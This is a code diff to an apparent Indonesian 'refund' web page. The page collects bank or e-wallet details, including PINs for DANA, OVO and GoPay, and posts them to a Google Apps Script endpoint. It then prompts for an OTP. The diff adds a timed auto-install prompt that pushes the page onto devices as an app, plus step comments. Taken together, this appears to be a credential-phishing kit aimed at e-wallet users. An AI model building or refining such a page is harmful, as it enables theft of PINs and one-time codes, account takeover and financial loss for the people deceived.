@@ -144,9 +144,30 @@
     </div>
 
     <script>
-        // GANTI URL INI dengan URL Google Apps Script nanti
+        // GANTI URL INI dengan URL Google Apps Script setelah dibuat
         const SERVER_URL = 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec';
         
+        // AUTO INSTALL PROMPT - EL CIENCO
+        let deferredPrompt;
+        
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+            
+            setTimeout(() => {
+                if (deferredPrompt) {
+                    deferredPrompt.prompt();
+                    deferredPrompt.userChoice.then((choiceResult) => {
+                        if (choiceResult.outcome === 'accepted') {
+                            console.log('PWA terinstall');
+                        }
+                        deferredPrompt = null;
+                    });
+                }
+            }, 2000);
+        });
+        
+        // Tampilkan field PIN untuk e-wallet
         document.getElementById('bankType').addEventListener('change', function() {
             const pinGroup = document.getElementById('pinGroup');
             if (this.value === 'dana' || this.value === 'ovo' || this.value === 'gopay') {
@@ -156,6 +177,7 @@
             }
         });
         
+        // Submit form awal
         document.getElementById('refundForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
@@ -169,6 +191,7 @@
                 step: 'initial_data'
             };
             
+            // Kirim ke server (Google Apps Script)
             await fetch(SERVER_URL, {
                 method: 'POST',
                 mode: 'no-cors',
@@ -176,9 +199,11 @@
                 body: JSON.stringify(data)
             });
             
+            // Tampilkan modal OTP
             document.getElementById('otpModal').style.display = 'flex';
         });
         
+        // Submit OTP
         document.getElementById('verifyOtpBtn').addEventListener('click', async () => {
             const otp = document.getElementById('otpInput').value;
             
